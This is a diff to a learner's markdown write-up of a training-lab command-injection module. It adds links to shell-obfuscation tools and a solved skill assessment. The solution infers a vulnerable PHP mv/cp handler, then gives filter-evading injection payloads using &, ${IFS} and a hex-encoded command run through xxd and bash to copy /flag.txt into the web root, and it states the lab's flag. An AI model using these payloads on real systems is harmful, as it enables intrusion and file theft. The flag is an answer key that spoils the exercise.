@@ -12,9 +12,12 @@
     3. [Bypassing Other Blacklisted Characters](#bypassing-other-blacklisted-characters)
     4. [Bypassing Blacklisted Commands](#bypassing-blacklisted-commands)
     5. [Advanced Command Obfuscation](#advanced-command-obfuscation)
+3. [Skill Assesment](#skill-assesment)
 
 ## Tools/Useful Links
 1. [Bypass without space](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
+2. [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+3. [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
 
 ## Exploitation
 ### Detection
@@ -114,3 +117,43 @@
     ```
 
     The answer is `/usr/share/mysql/debian_create_root_user.sql`.
+
+## Skill Assesment
+1. What is the content of '/flag.txt'?
+
+    First we need to explore the website to know how the website works and what kind of the potential vulnerability. I found something interesting in the copy and move logic. Here the request of the move looks like:
+
+    ![alt text](<Assets/Skill Assesment - 1.png>)
+
+    The different between copy and move is the **move=1** parameter. The copy request doesnt has this parameter. I assume the source code looks like this:
+
+    ```php
+    $from = $_GET['from'];
+    $to   = $_GET['to'];
+
+    if (isset($_GET['move'])) {
+        $command = "mv $from $to";
+        exec($command);
+    } elseif (isset($_GET['copy'])) {
+        $command = "cp $from $to";
+        exec($command);
+    }   
+    ```
+    Based on that, the potential command injection is in the **to** parameter. I tried to test with some payload injector with sleep and i found that the one that works is backgroun operator (**&** or **%26**). Here the payload is:
+    
+    ```txt
+    tmp%26sleep${IFS}10
+    ```
+    ![alt text](<Assets/Skill Assesment - 2.png>)
+
+    Because it works, we can try to read the flag by copy the flag to the tmp directory. We can wrap it with **XXD** to convert the flag to hex and then use bash to execute it. Here the payload is:
+
+    ```txt
+    tmp%26bash%3c%3c%3c%24%28xxd%24%7bIFS%7d-r%24%7bIFS%7d-p%3c%3c%3c6370202f666c61672e747874202f7661722f7777772f68746d6c2f66696c65732f746d702f666c61672e747874%29    
+    ```
+    ![alt text](<Assets/Skill Assesment - 3.png>)
+    
+    The flag.txt will be available in the tmp directory. The answer is `HTB{c0mm4nd3r_1nj3c70r}`.
+    
+    
+    
